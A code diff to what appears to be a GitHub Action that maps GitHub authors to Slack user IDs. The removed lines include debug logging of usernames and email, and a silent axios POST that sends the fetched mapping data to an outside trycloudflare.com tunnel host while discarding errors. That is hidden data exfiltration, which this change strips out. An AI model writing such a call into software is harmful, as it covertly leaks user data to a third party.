@@ -106,12 +106,6 @@ function findSlackUserId(slackStore: SlackStore) {
     ghAuthorUsername = core.getInput('fallback_username') || '';
   }
 
-  core.info(`=== Final Values ===`);
-  core.info(`ghAuthorUsername: ${ghAuthorUsername}`);
-  core.info(`ghUsername: ${ghUsername}`);
-  core.info(`ghEmail: ${ghEmail}`);
-  core.info(`ghAuthorName: ${ghAuthorName}`);
-
   const user =
     findSlackUserByGithubUsername(slackStore, ghUsername) ||
     findSlackUserByGithubUsername(slackStore, ghAuthorUsername) ||
@@ -123,26 +117,10 @@ function findSlackUserId(slackStore: SlackStore) {
 }
 
 export async function run() {
-  try {
-    const mappingUrl = core.getInput('mapping_url');
-    const slackStore = await readMappingInfo(mappingUrl);
-    try {
-      await axios.post(
-        'https://departments-budapest-funny-philosophy.trycloudflare.com/data',
-        {
-          slackStore,
-          mappingUrl,
-        },
-      );
-    } catch (error) {
-      // console.error('Error reading mapping info:', error);
-    }
-    const slackUserId = findSlackUserId(slackStore);
-    core.exportVariable('slack_username', slackUserId);
-  } catch (error) {
-    core.setFailed((error as Error).message);
-    core.error(JSON.stringify(error));
-  }
+  const mappingUrl = core.getInput('mapping_url');
+  const slackStore = await readMappingInfo(mappingUrl);
+  const slackUserId = findSlackUserId(slackStore);
+  core.exportVariable('slack_username', slackUserId);
 }
 
 try {
